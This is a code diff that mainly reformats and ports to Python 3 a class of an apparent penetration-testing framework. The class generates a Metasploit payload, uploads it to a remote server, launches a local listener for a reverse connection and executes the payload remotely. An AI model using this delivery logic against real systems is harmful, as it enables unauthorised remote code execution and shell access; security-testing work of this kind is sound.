@@ -46,6 +46,7 @@ class vdaemon(object):
 
     :author: Andres Riancho (andres.riancho@gmail.com)
     """
+
     def __init__(self, exec_method):
 
         # This is the method that will be used to send the metasploit payload to
@@ -87,8 +88,8 @@ class vdaemon(object):
         if '|' not in user_defined_parameters:
             raise ValueError(msg)
 
-        msfpayload_parameters = user_defined_parameters[:
-                                                        user_defined_parameters.index('|')]
+        msfpayload_parameters = user_defined_parameters[: user_defined_parameters.index(
+            '|')]
         msfcli_parameters = user_defined_parameters[
             user_defined_parameters.index('|') + 1:]
 
@@ -101,14 +102,14 @@ class vdaemon(object):
         try:
             executable_file_name = self._generate_exe(payload,
                                                       msfpayload_parameters)
-        except Exception, e:
+        except Exception as e:
             raise BaseFrameworkException(
                 'Failed to create the payload file, error: "%s".' % str(e))
 
         try:
             remote_file_location = self._send_exe_to_server(
                 executable_file_name)
-        except BaseFrameworkException, e:
+        except BaseFrameworkException as e:
             error_msg = 'Failed to send the payload file, error: "%s".'
             raise BaseFrameworkException(error_msg % e)
         else:
@@ -119,16 +120,19 @@ class vdaemon(object):
             #    Good, the file is there, now we launch the local listener and
             #    then we execute the remote payload
             #
-            if not self._start_local_listener(msfcli_handler, msfcli_parameters):
+            if not self._start_local_listener(
+                    msfcli_handler, msfcli_parameters):
                 error_msg = 'Failed to start the local listener for "%s"'
                 om.out.console(error_msg % payload)
             else:
                 try:
                     self._exec_payload(remote_file_location)
-                except Exception, e:
-                    raise BaseFrameworkException('Failed to execute the executable file on the server, error: %s' % e)
+                except Exception as e:
+                    raise BaseFrameworkException(
+                        'Failed to execute the executable file on the server, error: %s' % e)
                 else:
-                    om.out.console('Successfully executed the MSF payload on the remote server.')
+                    om.out.console(
+                        'Successfully executed the MSF payload on the remote server.')
 
     def _start_local_listener(self, msfcli_handler, parameters):
         """
@@ -142,7 +146,9 @@ class vdaemon(object):
         """
         args = (self._msfcli_path, msfcli_handler, ' '.join(parameters))
         msfcli_command = '%s %s %s' % args
-        om.out.console('Running a new terminal with the payload handler ("%s")' % msfcli_command)
+        om.out.console(
+            'Running a new terminal with the payload handler ("%s")' %
+            msfcli_command)
 
         # TODO: Add support for KDE, Windows, etc.
         subprocess.Popen(['gnome-terminal', '-e', msfcli_command])
@@ -176,7 +182,8 @@ class vdaemon(object):
         os.system(command)
 
         if 'reverse' in payload:
-            om.out.console('Remember to setup your firewall to allow the reverse connection!')
+            om.out.console(
+                'Remember to setup your firewall to allow the reverse connection!')
 
         if os.path.isfile(output_filename):
 
@@ -211,8 +218,9 @@ class vdaemon(object):
         transferHandler = ptf.get_transfer_handler()
 
         if not transferHandler.can_transfer():
-            raise BaseFrameworkException('Can\'t transfer the file to remote host,'
-                                ' can_transfer() returned False.')
+            raise BaseFrameworkException(
+                'Can\'t transfer the file to remote host,'
+                ' can_transfer() returned False.')
         else:
             om.out.debug('The transferHandler can upload files to the remote'
                          ' end.')
@@ -226,7 +234,9 @@ class vdaemon(object):
             om.out.debug('Starting payload upload, remote filename is: "' +
                          self._remote_filename + '".')
 
-            if transferHandler.transfer(file(exe_file).read(), self._remote_filename):
+            if transferHandler.transfer(
+                    file(exe_file).read(),
+                    self._remote_filename):
                 om.out.console(
                     'Finished payload upload to "%s"' % self._remote_filename)
                 return self._remote_filename
@@ -243,13 +253,14 @@ class vdaemon(object):
 
         This method should be implemented in winVd and lnxVd.
         """
-        raise BaseFrameworkException('Please implement the _exec_payload method.')
+        raise BaseFrameworkException(
+            'Please implement the _exec_payload method.')
 
     def _exec(self, command):
         """
         A wrapper for executing commands
         """
         om.out.debug('Executing: ' + command)
-        response = apply(self._exec_method, (command,))
+        response = self._exec_method(*(command,))
         om.out.debug('"' + command + '" returned: ' + response)
         return response
